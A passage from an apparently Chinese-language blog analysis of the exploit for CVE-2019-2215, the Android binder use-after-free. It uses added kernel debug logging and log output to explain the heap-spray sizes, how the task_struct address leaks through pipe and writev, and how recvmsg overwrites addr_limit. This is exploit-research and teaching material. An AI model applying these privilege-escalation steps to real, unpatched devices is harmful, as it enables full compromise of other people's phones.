class="keyword">bool</span> is_dead;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span>            <span class="comment">// 2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>1 处是漏洞触发成员，2 处 task 指定当前 <code>task_struct</code> 内存位置，如果能直接泄漏该处内存中数值，我们就能直接得到当前进程 <code>task_struct</code> 在内核中的位置。做数据占位时，需要知道 thread 结构大小和 1 处成员的结构偏移，这个可以在 <code>binder_get_thread()</code> 函数处增加一些 log 日志获取。测试环境 <code>android-goldfish-4.4-dev</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct binder_thread *<span class="title">binder_get_thread</span><span class="params">(struct binder_proc *proc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> size;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!thread) &#123;</span><br><span class="line">		size = <span class="keyword">sizeof</span>(*thread);</span><br><span class="line"></span><br><span class="line">		printk(KERN_INFO <span class="string">"POC: %s: binder_thread size: 0x%x  wait offset = 0x%x  stats offset = 0x%x task offset = 0x%x\n"</span>, __func__, size, offsetof(typeof(*thread), wait), offsetof(typeof(*thread), stats), offsetof(typeof(*thread), task));</span><br><span class="line">		</span><br><span class="line">	    ...</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> thread;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POC: binder_get_thread: binder_thread size: <span class="number">0x198</span>  wait offset = <span class="number">0xa0</span>  stats offset = <span class="number">0xb8</span> task offset = <span class="number">0x190</span></span><br><span class="line">POC: binder_get_thread: binder_thread size: <span class="number">0x198</span>  wait offset = <span class="number">0xa0</span>  stats offset = <span class="number">0xb8</span> task offset = <span class="number">0x190</span></span><br><span class="line">POC: binder_get_thread: binder_thread size: <span class="number">0x198</span>  wait offset = <span class="number">0xa0</span>  stats offset = <span class="number">0xb8</span> task offset = <span class="number">0x190</span></span><br></pre></td></tr></table></figure>

<p>调用占位函数做 heapspray 时，我们指定 0x198 大小就很有可能会占据已释放的 thread 结构内存，在 0xa0 处放置的数据需要根据情形构造。</p>
<h3 id="void-leak-task-struct-void"><a href="#void-leak-task-struct-void" class="headerlink" title="void leak_task_struct(void)"></a><code>void leak_task_struct(void)</code></h3><p>函数 <code>void leak_task_struct(void)</code> 用于泄漏 task，这是如何做到的呢？</p>
<p>为了方便我们判断是否占位成功，我们在 <code>static int binder_thread_relase()</code> 中将 UAF 的 thread 结构的内存地址打印出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">binder_thread_release</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// CVE-2019-2215 fix commit</span></span><br><span class="line">	<span class="comment">// /*</span></span><br><span class="line">	<span class="comment">//  * If this thread used poll, make sure we remove the waitqueue</span></span><br><span class="line">	<span class="comment">//  * from any epoll data structures holding it with POLLFREE.</span></span><br><span class="line">	<span class="comment">//  * waitqueue_active() is safe to use here because we're holding</span></span><br><span class="line">	<span class="comment">//  * the inner lock.</span></span><br><span class="line">	<span class="comment">//  */</span></span><br><span class="line">	<span class="comment">// if ((thread-&gt;looper &amp; BINDER_LOOPER_STATE_POLL) &amp;&amp;</span></span><br><span class="line">	<span class="comment">//     waitqueue_active(&amp;thread-&gt;wait)) &#123;</span></span><br><span class="line">	<span class="comment">// 	wake_up_poll(&amp;thread-&gt;wait, POLLHUP | POLLFREE);</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">"POCDEMO"</span>, current-&gt;comm)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">"POC: %s: current = %p"</span>, __func__, current);</span><br><span class="line">		printk(KERN_INFO <span class="string">"POC: %s: thread = %p wait = %p task_list = %p prev = %p next = %p \n"</span>, __func__, thread, &amp;(thread-&gt;wait), &amp;(thread-&gt;wait.task_list), &amp;(thread-&gt;wait.task_list.prev), &amp;(thread-&gt;wait.task_list.next));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	binder_inner_proc_unlock(thread-&gt;proc);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>void leak_task_struct(void)</code> 采用 pipe 做占位和泄漏，关于利用 pipe TOCTTOU(time of check to time of use) 的利用方式，可以参考 <a href="https://www.anquanke.com/post/id/129468" target="_blank" rel="noopener">链表游戏：CVE-2017-10661之完全利用</a> 一文，不过在这里 pipe 是用来泄漏数据的。</p>
<p>writev 的执行，占位过程的调用链如下：</p>
<div align="center">
<img src="https://note.youdao.com/yws/api/personal/file/WEB400a5072aa1eb0d363a265e7d6f92b47?method=download&shareKey=91837beb2479586e101d64a3c4d98ac7" alt="pipe-heapspray" style="width: 713px; height: 249px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="pipe-heapspray">
</div>

<p>在 <code>rw_copy_check_uvector()</code> 上添加调试日志</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> rw_copy_check_uvector()</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (nr_segs &gt; fast_segs) &#123;</span><br><span class="line">		iov = kmalloc(nr_segs*<span class="keyword">sizeof</span>(struct iovec), GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (iov == <span class="literal">NULL</span>) &#123;</span><br><span class="line">			ret = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">"POCDEMO"</span>, current-&gt;comm)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">"POC: %s: iov = %p  iovlen = 0x%lx\n"</span>, __func__, iov, nr_segs);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(iov, uvector, nr_segs*<span class="keyword">sizeof</span>(*uvector))) &#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行 <code>ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);</code>，内核里会对应执行到 <code>binder_thread_release()</code> 释放 thread 结构数据；此时，调用 writev 执行 <code>rw_copy_check_uvector()</code>  分配的 iov 就很大概率是之前 thread 的内存。</p>
<p>截取关键日志：</p>
<div align="center">
<img src="https://note.youdao.com/yws/api/personal/file/WEBbd4fc08a22a28343089b092dea33512f?method=download&shareKey=629b9af63c2450ef2703219655e21b32" alt="leak-log1" style="width: 666px; height: 85px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="leak-log1">
</div>

<p>占位的成功率还是比较高的。</p>
<p>接下来，执行 <code>epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &amp;event);</code> 触发漏洞，该函数在内核中执行链是：</p>
<div align="center">
<img src="https://note.youdao.com/yws/api/personal/file/WEB1eb16f0f29288e5d2e2d3d2d2abdf15a?method=download&shareKey=654eefbe6aff4983d3f1fe15415ed3a8" alt="epoll-trigger" style="width: 762px; height: 338px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="epoll-trigger">
</div>

<p>我们在 <code>remove_wait_queue()</code> 中添加添加日志信息，观察漏洞触发前后 <code>wait_queue_head_t</code> 内存的变化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_wait_queue</span><span class="params">(<span class="keyword">wait_queue_head_t</span> *q, <span class="keyword">wait_queue_t</span> *wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">"POCDEMO"</span>, current-&gt;comm)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO_BEFOR: %s: wait  = %p task_list = %p prev = %p next = %p \n"</span>, __func__, wait, &amp;(wait-&gt;task_list), &amp;(wait-&gt;task_list.prev), &amp;(wait-&gt;task_list.next));</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO_BEFOR: %s: whead = %p task_list = %p prev = %p next = %p \n"</span>, __func__, q, &amp;(q-&gt;task_list), &amp;(q-&gt;task_list.prev), &amp;(q-&gt;task_list.next));</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO_BEFOR: %s: 0x%lx 0x%lx 0x%lx 0x%lx\n"</span>, __func__, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q + <span class="number">1</span>), *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q+<span class="number">2</span>), *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q+<span class="number">3</span>));</span><br><span class="line">		<span class="comment">// print_hex_dump_bytes("POCDEMO_BEFOR", DUMP_PREFIX_NONE, q, 0x20);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	spin_lock_irqsave(&amp;q-&gt;lock, flags);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">"POCDEMO"</span>, current-&gt;comm)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO_DEMOE: %s: [1] 0x%lx 0x%lx 0x%lx 0x%lx\n"</span>, __func__, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q + <span class="number">1</span>), *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q+<span class="number">2</span>), *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q+<span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__remove_wait_queue(q, wait);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">"POCDEMO"</span>, current-&gt;comm)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO_DEMOE: %s: [2] 0x%lx 0x%lx 0x%lx 0x%lx\n"</span>, __func__, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q + <span class="number">1</span>), *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q+<span class="number">2</span>), *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q+<span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	spin_unlock_irqrestore(&amp;q-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">"POCDEMO"</span>, current-&gt;comm)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO_AFTER: %s: wait  = %p task_list = %p prev = %p next = %p \n"</span>, __func__, wait, &amp;(wait-&gt;task_list), &amp;(wait-&gt;task_list.prev), &amp;(wait-&gt;task_list.next));</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO_AFTER: %s: whead = %p task_list = %p prev = %p next = %p \n"</span>, __func__, q, &amp;(q-&gt;task_list), &amp;(q-&gt;task_list.prev), &amp;(q-&gt;task_list.next));</span><br><span class="line">		<span class="comment">// print_hex_dump_bytes("POCDEMO_AFTER", DUMP_PREFIX_NONE, q, 0x20);</span></span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO_AFTER: %s: 0x%lx 0x%lx 0x%lx 0x%lx\n"</span>, __func__, *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q, *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q + <span class="number">1</span>), *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q+<span class="number">2</span>), *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)q+<span class="number">3</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(remove_wait_queue);</span><br></pre></td></tr></table></figure>

<div align="center">
<img src="https://note.youdao.com/yws/api/personal/file/WEB49e61574f62cc7e27fdde8d86a977e4b?method=download&shareKey=08f5bbbb98411b36c2c22002fc83ee60" alt="leak-log2" style="width: 670px; height: 176px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="leak-log2">
</div>


<p>多次调试发现， <code>iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base</code> 值在漏洞触发时总会被写为 <code>wait-&gt;task_list.next</code> 的内存地址。关键内存区域数据前后变化如下图所示：</p>
<div align="center">
<img src="https://note.youdao.com/yws/api/personal/file/WEB702dae7b981fb57973a492a16c6ed3f1?method=download&shareKey=f0b58df36b09e3e4dd075c64d59e11bf" alt="leak-data-change" style="width: 764px; height: 160px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="leak-data-change">
</div>

<p>漏洞触发后，<code>iovec_array[IOVEC_INDX_FOR_WQ+1]</code> 的 <code>iov_base</code> 更改为 <code>0xffffffc0572224a8</code>，<code>iov_len</code> 依然保持 <code>0x1000</code>，pipe read 的时候，将从 <code>0xffffffc0572224a8</code> 处开始读取 <code>0x1000</code> 大小的内存块，<code>binder_thread</code> 结构中的 <code>*task</code> 指针值将包含在此范围，这样就泄漏出了当前进程 <code>task_struct</code> 的内核地址。</p>
<h3 id="void-clobber-addr-limit-void"><a href="#void-clobber-addr-limit-void" class="headerlink" title="void clobber_addr_limit(void)"></a><code>void clobber_addr_limit(void)</code></h3><p>函数 <code>void clobber_addr_limit(void)</code> 用于关闭掉进程 <code>addr_limit</code>，函数的关键是使用了 socket 做内存写，从函数名看，写的是 <code>addr_limit</code> ，熟悉提权相关的结构数据一般会知道 <code>addr_limit</code> 与  <code>task_struct</code> 在内存中是紧挨着存放的，从 thread_info 结构中可以看出：</p>
<div align="center">
<img src="https://note.youdao.com/yws/api/personal/file/WEB8865927433092b711ce1c2ddf1e12b4d?method=download&shareKey=c6a3e033a60b114a47878eb07efe8856" alt="thread_info" style="width: 684px; height: 347px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="thread_info">
</div>

<p>当前进程的 <code>thread_info</code> 在内核栈中，所以 <code>addr_limit</code> 的地址是 <code>task_struct</code> 地址再加 0x8。</p>
<p><code>socketpair()</code> 会创建一对连接好的 UNIX 族的全双工通信 socket，这与 pipe 返回的 fd 类似，只是任一个 fd 都可读可写的。</p>
<p>很明显，执行完 <code>ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);</code> 之后的 <code>recvmsg()</code> 是用来做数据填充的，占位刚刚释放的 <code>binder_thread</code> 内存。占位的调用链如下：</p>
<div align="center">
<img src="https://note.youdao.com/yws/api/personal/file/WEBae0ec2028e52616a495157859738b57e?method=download&shareKey=9e1f951c548a183fd7f87191c76c20dc" alt="clobber_fill" style="width: 630px; height: 244px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="clobber_fill">
</div>

<p>这与上述 pipe 的占位过程一致。需要注意 <code>recvmsg()</code> 在占位完成后会阻塞住，直到写端的数据到来。写端有数据到来时会按照传入的 <code>iovec_array</code> 的 <code>iov_base</code> 与 <code>iov_len</code> 顺序对应写入。</p>
<p>POC 中有两次写操作，分别写入 1 字节的 <code>&quot;X&quot;</code> 和 <code>second_write_chunk</code>。没有漏洞的情形下，写入操作应该如下图所示：</p>
<div align="center">
<img src="https://note.youdao.com/yws/api/personal/file/WEBd16e9631483f06af97ab2b30fd0a88c9?method=download&shareKey=75974561c37e95a4754743fc90b84ac6" alt="recvmsg_write" style="width: 688px; height: 408px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="recvmsg_write">
</div>

<p><code>0xDEADBEEF</code> 和 <code>0xBEEFDEAD</code> 是非法地址，在漏洞触发时，这两处地址应该会被更改掉。</p>
<p><code>copy_to_iter</code> 调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyS_recvmsg() --&gt; ___sys_recvmsg() --&gt; sock_recvmsg() --&gt; unix_stream_recvmsg() --&gt; unix_stream_read_generic() --&gt; unix_stream_read_actor() --&gt; skb_copy_datagram_iter() --&gt; copy_page_to_iter() --&gt; copy_to_iter()</span><br></pre></td></tr></table></figure>

<p>在 <code>copy_to_iter()</code> 中加入调试日志：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> copy_to_iter(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> bytes, struct iov_iter *i)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="keyword">char</span> *from = addr;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">		bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">"POCDEMO"</span>, current-&gt;comm)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO BE: %s: addr=0x%p bytes=0x%lx\n"</span>, __func__, addr, bytes);</span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO BE: %s: iov=0x%p  type=0x%x  offset=0x%lx count=0x%lx iov=%p segs=0x%lx iov-&gt;base=0x%p=0x%lx iov-&gt;len=0x%lx\n"</span>, </span><br><span class="line">				__func__, </span><br><span class="line">				i, i-&gt;type, i-&gt;iov_offset, </span><br><span class="line">				i-&gt;count, i-&gt;iov, i-&gt;nr_segs, </span><br><span class="line">				i-&gt;iov-&gt;iov_base, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(i-&gt;iov-&gt;iov_base), i-&gt;iov-&gt;iov_len);</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; bytes/<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>) + <span class="number">1</span>; j++) &#123;</span><br><span class="line">			printk(KERN_INFO <span class="string">"POCDEMO BE: %s: 0x%lx --&gt; 0x%lx\n"</span>, __func__, </span><br><span class="line">				(<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr + j*<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>), </span><br><span class="line">				*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)addr + j));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; (i-&gt;nr_segs)*<span class="number">2</span> + <span class="number">2</span>; j++) &#123;</span><br><span class="line">			printk(KERN_INFO <span class="string">"POCDEMO BE: %s: iov value 0x%lx --&gt; 0x%lx\n"</span>, __func__, </span><br><span class="line">				(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(i-&gt;iov) + j*<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>), </span><br><span class="line">				*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(i-&gt;iov) + j));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	iterate_and_advance(i, bytes, v,</span><br><span class="line">		__copy_to_user(v.iov_base, (from += v.iov_len) - v.iov_len,</span><br><span class="line">			       v.iov_len),</span><br><span class="line">		memcpy_to_page(v.bv_page, v.bv_offset,</span><br><span class="line">			       (from += v.bv_len) - v.bv_len, v.bv_len),</span><br><span class="line">		<span class="built_in">memcpy</span>(v.iov_base, (from += v.iov_len) - v.iov_len, v.iov_len)</span><br><span class="line">	)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="string">"POCDEMO"</span>, current-&gt;comm)) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; (i-&gt;nr_segs)*<span class="number">2</span> + <span class="number">2</span>; j++) &#123;</span><br><span class="line">			printk(KERN_INFO <span class="string">"POCDEMO AF: %s: iov value 0x%lx --&gt; 0x%lx\n"</span>, __func__, </span><br><span class="line">				(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(i-&gt;iov) + j*<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>), </span><br><span class="line">				*((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(i-&gt;iov) + j));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		printk(KERN_INFO <span class="string">"POCDEMO AF: %s bytes=0x%lx\n\n\n"</span>, __func__, bytes);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(copy_to_iter);</span><br></pre></td></tr></table></figure>

<p>多加些打印值，让我们观察前后数据变化，日志比较长，择取关键如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line">********** <span 